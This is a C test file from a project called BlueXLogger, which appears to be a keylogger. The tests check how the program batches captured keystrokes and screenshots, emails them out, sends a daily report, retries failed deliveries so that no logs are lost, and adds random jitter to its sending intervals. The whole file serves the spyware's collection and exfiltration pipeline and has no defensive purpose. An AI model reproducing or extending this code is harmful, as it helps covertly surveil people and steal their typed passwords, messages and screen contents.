/*============================================================================
 * BlueXLogger - tests/test_schedule.c
 * Batch collection / delivery scheduling tests.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * The central property under test is the anti-spam contract from the
 * specification: there is never one email per keystroke. Collection happens
 * only when an interval elapses OR a keystroke threshold is crossed, whichever
 * happens first, and delivery is a separate, retried concern.
 *
 * The scheduler takes the clock as a parameter, so every test here drives it
 * with explicit timestamps - no sleeping, no flakiness.
 *==========================================================================*/
#include "tests.h"
#include "bxl_schedule.h"
#include "bxl_util.h"

/*==========================================================================
 * Helpers
 *========================================================================*/
static void base_cfg(BxlConfig *c)
{
    bxl_config_defaults(c);
    c->jitter_enabled = 0;          /* deterministic timing for tests */
    c->shot_enabled   = 0;
    c->daily_enabled  = 0;
    c->log_interval_min        = 10;
    c->log_keystroke_threshold = 0;
}

/* Count LOG actions produced by ticking every `step` ms across `span` ms. */
static int count_log_actions(const BxlConfig *cfg, bxl_u64 span, bxl_u64 step)
{
    BxlSched s;
    bxl_u64 t;
    int     logs = 0;

    bxl_sched_init(&s, cfg, 0, 0, 1);
    for (t = step; t <= span; t += step) {
        bxl_sched_note_keystrokes(&s, 1);
        if (bxl_sched_tick(&s, cfg, t, 0) & BXL_ACT_LOG) logs++;
    }
    return logs;
}

/*==========================================================================
 * The anti-spam contract
 *========================================================================*/
static void t_no_per_keystroke_email(void)
{
    BxlConfig c;
    BxlSched  s;
    bxl_u32   acts;

    t_begin("typing alone never produces an email");
    base_cfg(&c);
    /* 100 keystrokes over 100 seconds with a 10 minute interval. */
    T_INT(count_log_actions(&c, 100000, 1000), 0);

    t_begin("the interval trigger fires exactly once per interval");
    bxl_sched_init(&s, &c, 0, 0, 1);
    acts = bxl_sched_tick(&s, &c, 600000, 0);      /* 10 minutes */
    T_OK((acts & BXL_ACT_LOG) != 0);
    acts = bxl_sched_tick(&s, &c, 600001, 0);
    T_OK((acts & BXL_ACT_LOG) == 0);
    acts = bxl_sched_tick(&s, &c, 1199999, 0);
    T_OK((acts & BXL_ACT_LOG) == 0);
    acts = bxl_sched_tick(&s, &c, 1200000, 0);
    T_OK((acts & BXL_ACT_LOG) != 0);

    t_begin("one keystroke threshold crossing yields one batch, not N");
    base_cfg(&c);
    c.log_interval_min        = 0;      /* threshold is the only trigger */
    c.log_keystroke_threshold = 5;
    bxl_sched_init(&s, &c, 0, 0, 1);
    bxl_sched_note_keystrokes(&s, 5);
    T_OK((bxl_sched_tick(&s, &c, 100, 0) & BXL_ACT_LOG) != 0);
    T_OK((bxl_sched_tick(&s, &c, 200, 0) & BXL_ACT_LOG) == 0);
    T_INT(s.keystrokes, 0);             /* counter reset by the batch */

    t_begin("whichever trigger fires first wins");
    base_cfg(&c);
    c.log_interval_min        = 10;
    c.log_keystroke_threshold = 5;
    bxl_sched_init(&s, &c, 0, 0, 1);
    bxl_sched_note_keystrokes(&s, 5);
    /* Only 30 seconds in, but the threshold has already been crossed. */
    T_OK((bxl_sched_tick(&s, &c, 30000, 0) & BXL_ACT_LOG) != 0);

    t_begin("re-arming after a threshold trip does not double-send");
    /* The interval restarts from the threshold trip, so nothing fires at the
     * original 10 minute mark. */
    T_OK((bxl_sched_tick(&s, &c, 600000, 0) & BXL_ACT_LOG) == 0);
    T_OK((bxl_sched_tick(&s, &c, 630000, 0) & BXL_ACT_LOG) != 0);

    t_begin("a large keystroke burst still collapses into one batch");
    base_cfg(&c);
    c.log_interval_min        = 0;
    c.log_keystroke_threshold = 10;
    bxl_sched_init(&s, &c, 0, 0, 1);
    bxl_sched_note_keystrokes(&s, 10000);
    T_OK((bxl_sched_tick(&s, &c, 1, 0) & BXL_ACT_LOG) != 0);
    T_OK((bxl_sched_tick(&s, &c, 2, 0) & BXL_ACT_LOG) == 0);
}

/*==========================================================================
 * Screenshot schedule
 *========================================================================*/
static void t_screenshots(void)
{
    BxlConfig c;
    BxlSched  s;
    bxl_u32   acts;

    t_begin("screenshots are collected on their own interval");
    base_cfg(&c);
    c.shot_enabled      = 1;
    c.shot_interval_min = 5;
    bxl_sched_init(&s, &c, 0, 0, 1);

    acts = bxl_sched_tick(&s, &c, 299999, 0);
    T_OK((acts & BXL_ACT_SHOT) == 0);
    acts = bxl_sched_tick(&s, &c, 300000, 0);
    T_OK((acts & BXL_ACT_SHOT) != 0);
    acts = bxl_sched_tick(&s, &c, 300001, 0);
    T_OK((acts & BXL_ACT_SHOT) == 0);
    acts = bxl_sched_tick(&s, &c, 600000, 0);
    T_OK((acts & BXL_ACT_SHOT) != 0);

    t_begin("disabling screenshots stops collection entirely");
    base_cfg(&c);
    c.shot_enabled      = 0;
    c.shot_interval_min = 5;
    bxl_sched_init(&s, &c, 0, 0, 1);
    acts = bxl_sched_tick(&s, &c, 3600000, 0);
    T_OK((acts & BXL_ACT_SHOT) == 0);

    t_begin("a screenshot batch does not drag the log batch with it");
    base_cfg(&c);
    c.shot_enabled      = 1;
    c.shot_interval_min = 1;
    c.log_interval_min  = 10;
    bxl_sched_init(&s, &c, 0, 0, 1);
    acts = bxl_sched_tick(&s, &c, 60000, 0);
    T_OK((acts & BXL_ACT_SHOT) != 0);
    T_OK((acts & BXL_ACT_LOG) == 0);
}

/*==========================================================================
 * Daily report
 *========================================================================*/
static void t_daily(void)
{
    BxlConfig c;
    BxlSched  s;
    bxl_u32   acts;
    bxl_u64   due;

    t_begin("the daily report fires at the configured wall-clock time");
    base_cfg(&c);
    c.daily_enabled = 1;
    c.daily_hour    = 9;
    c.daily_minute  = 30;
    bxl_sched_init(&s, &c, 0, 1000000, 1);
    due = s.next_daily_unix;
    T_OK(due > 1000000);

    acts = bxl_sched_tick(&s, &c, 1000, due - 1);
    T_OK((acts & BXL_ACT_DAILY) == 0);

    acts = bxl_sched_tick(&s, &c, 2000, due);
    T_OK((acts & BXL_ACT_DAILY) != 0);
    T_OK((acts & BXL_ACT_LOG)  != 0);   /* daily implies a log batch   */
    T_OK((acts & BXL_ACT_SHOT) != 0);   /* ... and a screenshot batch  */
    T_INT(s.daily_reports, 1);

    t_begin("the next daily report is scheduled for the following day");
    T_OK(s.next_daily_unix > due);
    acts = bxl_sched_tick(&s, &c, 3000, due + 60);
    T_OK((acts & BXL_ACT_DAILY) == 0);
}

/*==========================================================================
 * Delivery queue + retry backoff
 *========================================================================*/
static void t_delivery(void)
{
    BxlConfig c;
    BxlSched  s;
    bxl_u32   acts;

    base_cfg(&c);
    bxl_sched_init(&s, &c, 0, 0, 1);

    t_begin("an empty queue never flushes");
    T_OK((bxl_sched_tick(&s, &c, 5000, 0) & BXL_ACT_FLUSH) == 0);

    t_begin("queuing a batch makes it flush promptly");
    bxl_sched_note_log_queued(&s);
    T_INT(s.pending_logs, 1);
    T_INT(s.batches_collected, 1);
    acts = bxl_sched_tick(&s, &c, 5000, 0);
    T_OK((acts & BXL_ACT_FLUSH) != 0);

    t_begin("a flush does not spin on the very next tick");
    T_OK((bxl_sched_tick(&s, &c, 5001, 0) & BXL_ACT_FLUSH) == 0);

    t_begin("a failed delivery backs off exponentially from 30s");
    bxl_sched_note_delivery_failed(&s, 10000);
    T_INT(s.retry_streak, 1);
    T_INT(s.next_flush_ms, 10000 + 30000);
    T_OK((bxl_sched_tick(&s, &c, 10000 + 29999, 0) & BXL_ACT_FLUSH) == 0);
    T_OK((bxl_sched_tick(&s, &c, 10000 + 30000, 0) & BXL_ACT_FLUSH) != 0);

    t_begin("the backoff doubles and then caps at 15 minutes");
    bxl_sched_note_delivery_failed(&s, 0);
    T_INT(s.retry_streak, 2);
    T_INT(s.next_flush_ms, 60000);
    bxl_sched_note_delivery_failed(&s, 0);
    T_INT(s.retry_streak, 3);
    T_INT(s.next_flush_ms, 120000);
    bxl_sched_note_delivery_failed(&s, 0);
    bxl_sched_note_delivery_failed(&s, 0);
    bxl_sched_note_delivery_failed(&s, 0);
    T_INT(s.retry_streak, 6);
    T_INT(s.next_flush_ms, BXL_RETRY_MAX_MS);

    t_begin("logs are never dropped on a transient failure");
    T_INT(s.pending_logs, 1);

    t_begin("a successful delivery drains the queue and clears the backoff");
    bxl_sched_note_delivered(&s, 1, 0);
    T_INT(s.pending_logs, 0);
    T_INT(s.retry_streak, 0);
    T_OK((bxl_sched_tick(&s, &c, 99999999, 0) & BXL_ACT_FLUSH) == 0);

    t_begin("screenshot batches share the same queue discipline");
    bxl_sched_note_shot_queued(&s);
    T_INT(s.pending_shots, 1);
    T_OK((bxl_sched_tick(&s, &c, 100000000, 0) & BXL_ACT_FLUSH) != 0);
    bxl_sched_note_delivered(&s, 0, 1);
    T_INT(s.pending_shots, 0);
}

/*==========================================================================
 * Jitter and wait computation
 *========================================================================*/
static void t_jitter_and_wait(void)
{
    BxlConfig c;
    BxlSched  s;
    bxl_u32   rng;
    bxl_u64   base = 10ULL * 60000ULL;
    bxl_u64   lo   = base - base / 10;
    bxl_u64   hi   = base + base / 10;
    int       i;

    t_begin("jitter is disabled when configured off");
    base_cfg(&c);
    T_INT(bxl_sched_interval_ms(&c, 10, NULL), base);

    t_begin("a zero interval means never");
    T_INT(bxl_sched_interval_ms(&c, 0, NULL), (bxl_u64)-1);

    t_begin("jitter stays inside the configured percentage");
    c.jitter_enabled = 1;
    c.jitter_percent = 10;
    rng = 0xC0FFEEu;
    for (i = 0; i < 500; i++) {
        bxl_u64 v = bxl_sched_interval_ms(&c, 10, &rng);
        T_OK(v >= lo && v <= hi);
    }

    t_begin("jitter never drops the interval below five seconds");
    {
        bxl_u32 r2 = 1;
        c.jitter_percent = 50;
        for (i = 0; i < 200; i++)
            T_OK(bxl_sched_interval_ms(&c, 1, &r2) >= 5000);
    }

    t_begin("ms_until_next is bounded to a sane polling window");
    base_cfg(&c);
    c.log_interval_min = 60;
    bxl_sched_init(&s, &c, 0, 0, 1);
    {
        bxl_u64 w = bxl_sched_ms_until_next(&s, 0, 0);
        T_OK(w <= 60000);
        T_OK(w >= 200);
    }
    {
        bxl_u64 w = bxl_sched_ms_until_next(&s, s.next_log_ms - 100, 0);
        T_OK(w <= 200);
    }
}

/*==========================================================================
 * Suite entry point
 *========================================================================*/
void test_schedule(void)
{
    t_suite("scheduling / batching");
    t_no_per_keystroke_email();
    t_screenshots();
    t_daily();
    t_delivery();
    t_jitter_and_wait();
}
